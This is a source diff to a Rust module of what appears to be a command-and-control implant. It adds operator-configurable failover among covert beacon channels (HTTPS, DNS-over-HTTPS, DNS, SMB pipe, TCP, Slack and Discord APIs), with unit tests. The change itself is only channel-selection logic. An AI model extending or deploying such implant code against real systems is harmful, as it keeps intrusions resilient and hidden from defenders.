@@ -9,7 +9,9 @@
 //! - `Channel` enum + `match` dispatch (no `dyn` — PIC-friendly under no_std).
 //! - `CURRENT_CHANNEL: AtomicU8` — runtime hot-switch via `SetChannel` command.
 //! - `ChannelCtx` — per-beacon context carrying all channel-specific params.
-//! - `FALLBACK_CHAIN` — build-time fallback order for automatic failover.
+//! - `FALLBACK_CHAIN` — build-time fallback order for automatic failover,
+//!   narrowed at runtime by `Config::fallback_bitmap` (see
+//!   [`next_fallback_with_bitmap`]).
 //!
 //! Channel numbering (new scheme — NOT the old transport.rs numbering):
 //! ```text
@@ -332,10 +334,62 @@ pub const PRIMARY_CHANNEL: Channel = Channel::Https;
 /// Returns the next channel to try after `current` fails.
 /// Walks the fallback chain; if exhausted, returns `None` (caller should
 /// long-sleep then reset to [`PRIMARY_CHANNEL`] and retry).
+///
+/// This is the build-time default behaviour — the full
+/// [`DEFAULT_FALLBACK_CHAIN`]. The runtime-configured variant is
+/// [`next_fallback_with_bitmap`]; `next_fallback(c)` is exactly
+/// `next_fallback_with_bitmap(c, 0)`.
 pub fn next_fallback(current: Channel) -> Option<Channel> {
     let chain: &[Channel] = DEFAULT_FALLBACK_CHAIN;
     let idx = chain.iter().position(|&c| c == current)?;
     chain.get(idx + 1).copied()
+}
+
+/// Returns the next channel to try after `current` fails, honouring the
+/// operator-configured `Config::fallback_bitmap` (wire spec-1, bit N =
+/// Channel enum value N).
+///
+/// Semantics:
+///
+/// - `bitmap == 0` — the default: identical to [`next_fallback`], the full
+///   build-time [`DEFAULT_FALLBACK_CHAIN`]. Backward compatibility for
+///   builds/configs that predate bitmap consumption.
+/// - `bitmap != 0` — the fallback chain is [`DEFAULT_FALLBACK_CHAIN`]
+///   *filtered* to channels whose bit is set, **preserving chain order**
+///   rather than ascending channel number: the chain encodes the intended
+///   degradation ladder (HTTP ladder first, pivot channels trailing), so
+///   bits {SmbPipe(3), Tcp(4)} resolve to `Tcp → SmbPipe`, not `SmbPipe →
+///   Tcp`. Bit positions are meaningless as an ordering signal.
+/// - The walk starts strictly *after* `current`'s position in the default
+///   chain, so clearing `current`'s own bit does not restart it — e.g. with
+///   Https's bit clear, an Https failure still advances to the first
+///   eligible channel behind it. A `current` that is not on the default
+///   chain at all (an operator-selected ExtC2 primary via `SetChannel`)
+///   starts the walk at the head of the filtered chain.
+/// - Bits for channels that are not on the default chain are ignored: the
+///   four ExtC2 channels (5-7) are deliberately never automatic fallbacks
+///   (they share Https's egress — see [`DEFAULT_FALLBACK_CHAIN`]), and
+///   channel 8 (DiscordApi) cannot be encoded in a u8 at all. A bitmap
+///   whose set bits touch no chain channel (e.g. ExtC2-only `0xE0`)
+///   therefore DISABLES automatic failover: every step returns `None` and
+///   the caller resets to [`PRIMARY_CHANNEL`] after the long sleep.
+///
+/// Exhaustion returns `None`, exactly like [`next_fallback`].
+pub fn next_fallback_with_bitmap(current: Channel, bitmap: u8) -> Option<Channel> {
+    if bitmap == 0 {
+        return next_fallback(current);
+    }
+    let chain: &[Channel] = DEFAULT_FALLBACK_CHAIN;
+    let start = match chain.iter().position(|&c| c == current) {
+        Some(idx) => idx + 1,
+        None => 0,
+    };
+    // Chain channel numbers are 0-4, so the shift never overflows; bits for
+    // non-chain channels can never match a chain entry by construction.
+    chain[start..]
+        .iter()
+        .copied()
+        .find(|c| bitmap & (1u8 << (*c as u8)) != 0)
 }
 
 // ══════════════════════════════════════════════════════════════════════════════
@@ -466,6 +520,90 @@ mod tests {
         assert_eq!(next_fallback(Channel::Mcp), None);
         assert_eq!(next_fallback(Channel::DiscordApi), None);
         assert_eq!(PRIMARY_CHANNEL, Channel::Https);
+    }
+
+    #[test]
+    fn fallback_bitmap_zero_matches_default_chain() {
+        // bitmap == 0 is the backward-compat path: it must resolve exactly
+        // like the static chain for every channel, on and off the chain.
+        for v in 0..=8u8 {
+            let ch = Channel::from_u8(v);
+            assert_eq!(next_fallback_with_bitmap(ch, 0), next_fallback(ch));
+        }
+    }
+
+    #[test]
+    fn fallback_bitmap_filters_chain_preserving_chain_order() {
+        // Doh(1)+Dns(2): Https → Doh → Dns → exhausted.
+        let bm = (1 << 1) | (1 << 2);
+        assert_eq!(
+            next_fallback_with_bitmap(Channel::Https, bm),
+            Some(Channel::DohDns)
+        );
+        assert_eq!(
+            next_fallback_with_bitmap(Channel::DohDns, bm),
+            Some(Channel::Dns)
+        );
+        assert_eq!(next_fallback_with_bitmap(Channel::Dns, bm), None);
+
+        // Smb(3)+Tcp(4): the resolved order is Tcp → Smb — the DEFAULT
+        // chain's degradation-ladder order, NOT ascending channel number
+        // (Smb=3 < Tcp=4). Bit position must not reorder the chain.
+        let bm = (1 << 3) | (1 << 4);
+        assert_eq!(
+            next_fallback_with_bitmap(Channel::Https, bm),
+            Some(Channel::Tcp)
+        );
+        assert_eq!(
+            next_fallback_with_bitmap(Channel::Tcp, bm),
+            Some(Channel::SmbPipe)
+        );
+        assert_eq!(next_fallback_with_bitmap(Channel::SmbPipe, bm), None);
+
+        // A cleared bit on `current` does not restart the walk: with only
+        // Smb set, an Https failure skips straight to Smb (the first
+        // eligible channel behind Https), and Dns — whose bit is clear —
+        // also advances to Smb rather than stalling.
+        let bm = 1 << 3;
+        assert_eq!(
+            next_fallback_with_bitmap(Channel::Https, bm),
+            Some(Channel::SmbPipe)
+        );
+        assert_eq!(
+            next_fallback_with_bitmap(Channel::Dns, bm),
+            Some(Channel::SmbPipe)
+        );
+    }
+
+    #[test]
+    fn fallback_bitmap_ignores_non_chain_bits() {
+        // ExtC2 bits only (5-7): no chain channel is eligible, so automatic
+        // failover is DISABLED — every step exhausts immediately and the
+        // caller resets to the primary after the long sleep.
+        let bm = 0b1110_0000;
+        for v in 0..=8u8 {
+            assert_eq!(next_fallback_with_bitmap(Channel::from_u8(v), bm), None);
+        }
+        // 0xFF: a u8 cannot encode channel 8 (DiscordApi) and the ExtC2
+        // bits are chain-ineligible, so the resolved chain is exactly the
+        // five default entries in order.
+        let bm = 0xFF;
+        assert_eq!(
+            next_fallback_with_bitmap(Channel::Https, bm),
+            Some(Channel::DohDns)
+        );
+        assert_eq!(
+            next_fallback_with_bitmap(Channel::Tcp, bm),
+            Some(Channel::SmbPipe)
+        );
+        assert_eq!(next_fallback_with_bitmap(Channel::SmbPipe, bm), None);
+        // An operator-selected ExtC2 primary (SetChannel) is not on the
+        // default chain: failover from it starts at the HEAD of the
+        // filtered chain.
+        assert_eq!(
+            next_fallback_with_bitmap(Channel::SlackApi, 1 << 4),
+            Some(Channel::Tcp)
+        );
     }
 
     #[test]
